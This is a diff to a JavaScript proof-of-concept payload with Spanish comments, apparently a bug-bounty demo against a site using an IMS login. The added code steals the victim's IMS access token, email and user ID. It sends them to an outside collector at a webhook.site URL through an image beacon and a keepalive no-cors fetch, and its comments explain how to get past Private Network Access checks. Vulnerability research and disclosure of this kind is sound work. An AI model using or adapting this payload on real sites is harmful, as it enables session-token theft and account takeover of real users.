@@ -21,6 +21,37 @@ if (window.__D0X_PWN__) {
 function run() {
   const origen = window.location.origin;
 
+  // === COLECTOR DEL ATACANTE ==============================================
+  // A donde se manda el token de la victima. Por defecto tu colector LOCAL
+  // (poc-collector.py escuchando en 127.0.0.1:8899). Loopback solo funciona si
+  // VOS abris el link en la misma maquina donde corre el colector — que es la
+  // demo correcta: sos tu propia victima con tu cuenta de prueba.
+  //
+  // Para el plano "web PUBLICA recibe el token" (una victima en otra maquina),
+  // cambia esta linea por tu URL de interactsh, p.ej.:
+  //   const COLLECTOR = 'https://abcd1234.oast.fun';
+  const COLLECTOR = 'https://webhook.site/86b8e563-613b-43e4-8e58-9a61e4c7c991';
+
+  // Manda el token al colector por dos vias, para atravesar el preflight de
+  // Private Network Access pase lo que pase:
+  //   1) Image beacon — subrecurso no-cors, no necesita leer la respuesta.
+  //   2) fetch keepalive — sobrevive a la navegacion; el colector responde
+  //      ACAO:* y Allow-Private-Network, asi que no lo bloquea PNA.
+  const enviar = (token, email, userId) => {
+    const url =
+      COLLECTOR + '/?t=' + encodeURIComponent(token) +
+      '&e=' + encodeURIComponent(email || '') +
+      '&u=' + encodeURIComponent(userId || '');
+    try { new Image().src = url; } catch (e) { /* ignora */ }
+    try {
+      // no-cors: la entrega igual llega al colector aunque no leamos la
+      // respuesta; evita ruido de CORS en consola durante la grabacion.
+      fetch(url, { method: 'GET', mode: 'no-cors', keepalive: true })
+        .then(() => console.log('[d0x] token enviado al colector'))
+        .catch((e) => console.warn('[d0x] beacon fetch fallo (img de respaldo ya salio):', e));
+    } catch (e) { /* ignora */ }
+  };
+
   // 1 — marcador programatico, para leer desde consola
   window.__PWNED__ = {
     origin: origen,
@@ -70,12 +101,14 @@ function run() {
     decir(
       '<b>token obtenido</b> (' + via + ') — largo <b>' + token.length + '</b>' +
       ' · email <b>' + (email || '-') + '</b>' +
-      ' · userId <b>' + (userId || '-') + '</b>'
+      ' · userId <b>' + (userId || '-') + '</b>' +
+      '<br>enviado al colector <b>' + COLLECTOR + '</b>'
     );
     window.__PWNED__.imsTokenLength = token.length;
     window.__PWNED__.imsEmail = email || null;
     window.__PWNED__.imsUserId = userId || null;
     console.log('[d0x] token IMS obtenido via ' + via + ', largo ' + token.length);
+    enviar(token, email, userId);
   };
 
   // Camino A — la instancia de IMS que Milo ya tiene cargada en la pagina.
